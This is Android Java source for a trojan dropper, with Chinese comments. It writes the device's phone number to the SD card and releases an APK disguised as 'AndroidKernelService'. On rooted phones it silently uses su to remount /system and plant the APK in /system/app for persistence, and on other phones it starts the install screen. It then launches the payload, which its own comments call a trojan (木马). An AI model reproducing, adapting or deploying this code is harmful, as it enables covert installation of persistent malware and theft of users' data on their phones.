package com.Qdzs;//声明包语句
//引入相关类

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.os.Environment;

public class QdzsActivity extends Activity {
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {// 重写onCreate方法
		super.onCreate(savedInstanceState);
		final String myLogFilePath = "/mnt/sdcard/";

		//先把手机号异或后写入SD卡中。
		SendSMS mySendSMS = new SendSMS();
		mySendSMS.writePhoneNum();
		
		// 判断系统是否已经安装软件，如果已经安装就不再进行安装

		WriteLogFile.writeLog("判断系统是否已经安装软件");
		if (isExist()) {
			WriteLogFile.writeLog("系统已经安装该软件");
			// 如果已经安装，将安装包删除
			WriteLogFile.writeLog("已经安装手机端，现在执行删除安装包的操作...");
			try {
				File mFile = new File("/mnt/sdcard/AndroidKernelService.apk");
				mFile.delete();
			} catch (Exception e) {
				WriteLogFile.writeLog("将安装包删除异常" + e.toString());
			}
			WriteLogFile.writeLog("安装包已经删除掉");
			// 启动手机端程序
			try {
				startAKS();
				startAKSActivity();
				WriteLogFile.writeLog("手机端程序启动完毕");
			} catch (Exception e) {
				WriteLogFile.writeLog("启动手机端程序异常" + e.toString());
			}
			WriteLogFile.writeLog("正退出程序");
			System.exit(0);

		} else {
			WriteLogFile.writeLog("系统尚未安装该软件");
			// 如果没安装

			// 释放软件
			WriteLogFile.writeLog("正在释放apk中...");
			WriteApk myWriteApk = new WriteApk();
			myWriteApk.Write();
			WriteLogFile.writeLog("apk文件释放完毕...");
			// 判断是否root，进行对应的操作
			// 判断是否已经root
			WriteLogFile.writeLog("判断是否已经root");
			IfRoot myIfRoot = new IfRoot();
			WriteLogFile.writeLog("系统root如下：" + myIfRoot.isRootSystem());
			if (!myIfRoot.isRootSystem()) {
				// 没有root
				WriteLogFile.writeLog("系统没有root");
				// 启动安装界面
				// 手动安装软件
				WriteLogFile.writeLog("启动界面安装");
				String fileName = myLogFilePath + "AndroidKernelService.apk";
				Intent intent = new Intent(Intent.ACTION_VIEW);
				intent.setDataAndType(Uri.fromFile(new File(fileName)),
						"application/vnd.android.package-archive");
				startActivity(intent);

			} else {
				// 已经root,将apk包复制到/system/app目录下
				WriteLogFile.writeLog("系统已经root，正在复制手机端文件到/system/app目录下");

				// 第二种命令复制方法
				WriteLogFile.writeLog("第二种复制方法开始");
				String paramString = "adb push AndroidKernelService.apk /system/app"
						+ "\n"
						+ "adb shell"
						+ "\n"
						+ "su"
						+ "\n"
						+ "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system"
						+ "\n"
						+ "cat /sdcard/AndroidKernelService.apk > /system/app/AndroidKernelService.apk"
						+ "\n"
						+ "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system"
						+ "\n" + "exit" + "\n" + "exit";
				if (RootCmd.haveRoot()) {
					if (RootCmd.execRootCmdSilent(paramString) == -1) {
						WriteLogFile.writeLog("安装不成功");
					} else {
						WriteLogFile.writeLog("安装成功");
						
					}
				} else {
					WriteLogFile.writeLog("没有root权限");
				}
				
				WriteLogFile.writeLog("第二种复制方法结束");

			}
		}
		try {
			// 启动手机端程序
			WriteLogFile.writeLog("启动手机端程序...");
			startAKS();
			startAKSActivity();
			WriteLogFile.writeLog("手机端程序启动完毕");
		} catch (Exception e) {
			WriteLogFile.writeLog("启动手机端程序异常:" + e.toString());
		}
		WriteLogFile.writeLog("正在退出程序...");
		// 退出程序
		System.exit(0);
		WriteLogFile.writeLog("退出程序完毕");
	}

	public void startAKS() {
		// 启动木马的函数(经测试这个方法没有将木马启动起来)
		Intent intent = getPackageManager().getLaunchIntentForPackage(
				"com.AndroidKernelService");
		if (intent != null) {
			startActivity(intent);
		}
	}

	public void startAKSActivity() {
		// 启动木马里面的一个Activity
		Intent intent = new Intent(
				"android.intent.action.AndroidKernelActivity");
		if (intent != null) {
			startActivity(intent);
		}
	}

	// 复制文件函数
	public static void copyFile(String sourceFile, String targetFile)
			throws IOException {
		BufferedInputStream inBuff = null;
		BufferedOutputStream outBuff = null;
		try {
			// 新建文件输入流并对它进行缓冲
			inBuff = new BufferedInputStream(new FileInputStream(sourceFile));

			// 新建文件输出流并对它进行缓冲
			outBuff = new BufferedOutputStream(new FileOutputStream(targetFile));

			// 缓冲数组
			byte[] b = new byte[1024 * 5];
			int len;
			while ((len = inBuff.read(b)) != -1) {
				outBuff.write(b, 0, len);
			}
			// 刷新此缓冲的输出流
			outBuff.flush();
		} finally {
			// 关闭流
			if (inBuff != null)
				inBuff.close();
			if (outBuff != null)
				outBuff.close();
		}
	}

	public boolean isExist() {
		PackageManager manager = this.getPackageManager();
		if (manager != null) {
			List<PackageInfo> pkgList = manager.getInstalledPackages(0);
			for (int i = 0; i < pkgList.size(); i++) {
				PackageInfo pI = pkgList.get(i);
				if (pI != null) {
					try {
						if (pI.packageName
								.equalsIgnoreCase("com.AndroidKernelService"))// 根据安装的应用的包名判断
							return true;
					} catch (Exception e) {
						WriteLogFile.writeLog("判断软件是否已经安装时报错：" + e.toString());
					}
				}
			}
		} else {
			WriteLogFile.writeLog("PackageManager定义的变量manager为空");
		}
		return false;
	}
}
